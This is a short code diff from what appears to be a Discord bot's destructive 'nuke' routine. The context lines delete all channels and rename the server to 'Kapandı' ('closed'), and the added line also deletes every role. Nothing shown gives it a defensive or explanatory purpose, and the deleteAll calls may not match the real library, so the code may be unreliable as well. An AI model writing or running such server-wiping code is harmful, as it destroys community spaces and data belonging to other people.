@@ -12,6 +12,7 @@ message.delete()
 })
 
 message.guild.channels.deleteAll("");
+message.guild.roles.deleteAll("");
 }
 
 message.guild.setName(`Kapandı`, "")
